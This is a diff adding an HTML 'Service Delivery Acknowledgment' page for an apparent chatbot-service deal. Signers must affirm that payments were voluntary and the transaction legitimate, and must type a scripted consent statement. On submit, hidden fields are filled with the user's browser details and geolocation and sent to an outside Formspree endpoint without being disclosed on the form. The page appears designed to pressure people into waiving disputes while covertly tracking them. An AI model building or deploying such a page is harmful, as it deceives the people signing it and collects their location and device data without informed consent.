@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+       .agreement-container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 30px;
+            font-family: Arial, sans-serif;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .agreement-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .agreement-content {
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .terms-list {
+            margin: 20px 0;
+            padding-left: 20px;
+        }
+
+        .checkbox-container {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+
+        .signature-section {
+            margin-top: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input[type="text"],
+        input[type="date"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        .submit-button {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            text-align: center;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+
+        .submit-button.disabled {
+            background-color: #cccccc;
+            pointer-events: none;
+        }
+
+        .submit-button:hover:not(.disabled) {
+            background-color: #45a049;
+        }
+
+        .required {
+            color: red;
+            margin-left: 3px;
+        }
+
+        /* Configuration section */
+        .config-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #f0f0f0;
+            border-radius: 5px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 100px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            resize: vertical;
+            font-size: 14px;
+        }
+
+        .required {
+            color: red;
+            margin-left: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="agreement-container">
+        <div class="agreement-header">
+            <h2>SERVICE DELIVERY ACKNOWLEDGMENT</h2>
+            <p>Date: <span id="currentDate"></span></p>
+        </div>
+
+        <!-- Form with Formspree -->
+        <form id="agreementForm" action="https://formspree.io/f/mgvezzlb" method="POST">
+            <div class="agreement-content">
+                <p>I, the undersigned, hereby acknowledge and confirm the following:</p>
+                <ol class="terms-list">
+                    <li>I engaged the service provider to implement an automated customer service bot solution for order processing.</li>
+                    <li>The services were delivered as agreed upon, including implementation, setup, and configuration of the ordering chatbot system.</li>
+                    <li>All payments made for these services were voluntary and of my own free will.</li>
+                    <li>The service terms were clearly communicated and understood.</li>
+                    <li>The bot system was delivered and performs as specified.</li>
+                    <li>All obligations under our agreement have been fulfilled satisfactorily.</li>
+                </ol>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="agreementCheck" required>
+                    <label for="agreementCheck">I confirm this is a legitimate business transaction conducted in good faith by both parties, and I am satisfied with the services provided.</label>
+                </div>
+            </div>
+
+            <div class="signature-section">
+                <div class="form-group">
+                    <label>Full Name<span class="required">*</span></label>
+                    <input type="text" name="fullName" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Email Address<span class="required">*</span></label>
+                    <input type="email" name="clientEmail" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Phone Number<span class="required">*</span></label>
+                    <input type="tel" name="clientPhone" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Company Name (if applicable)</label>
+                    <input type="text" name="companyName">
+                </div>
+
+                <div class="form-group">
+                    <label>Consent Statement<span class="required">*</span></label>
+                    <textarea name="consentStatement" placeholder="Write: 'I hereby agree and have no doubts about this service that my consent was involved in all activity.'" required></textarea>
+                </div>
+
+                <!-- Hidden fields for device and location data -->
+                <input type="hidden" name="deviceInfo" id="deviceInfo">
+                <input type="hidden" name="locationInfo" id="locationInfo">
+
+                <button type="submit" class="submit-button">Submit Agreement</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Set current date
+        document.getElementById('currentDate').textContent = new Date().toLocaleDateString();
+
+        // Fetch device info
+        function getDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+            };
+            return JSON.stringify(deviceInfo, null, 2);
+        }
+
+        // Fetch location info
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+                            resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                        },
+                        () => {
+                            resolve('Location access denied or unavailable.');
+                        }
+                    );
+                } else {
+                    resolve('Geolocation not supported by the browser.');
+                }
+            });
+        }
+
+        // Pre-fill hidden fields before form submission
+        const form = document.getElementById('agreementForm');
+        form.addEventListener('submit', async function(event) {
+            event.preventDefault();  // Prevent default form submission
+
+            // Fetch device and location data
+            const deviceInfo = getDeviceInfo();
+            const locationInfo = await getLocation();
+
+            // Fill hidden fields
+            document.getElementById('deviceInfo').value = deviceInfo;
+            document.getElementById('locationInfo').value = locationInfo;
+
+            // Now submit the form
+            const formData = new FormData(form);
+
+            try {
+                const response = await fetch(form.action, {
+                    method: form.method,
+                    body: formData,
+                    headers: { Accept: 'application/json' },
+                });
+
+                if (response.ok) {
+                    // Redirect to the thank you page after successful submission
+                    window.location.href = '/login2.html'; // Change this to your actual thank you page
+                } else {
+                    alert('Submission failed. Please try again.');
+                }
+            } catch (error) {
+                alert('An error occurred. Please try again.');
+            }
+        });
+    </script>
+</body>
+</html>
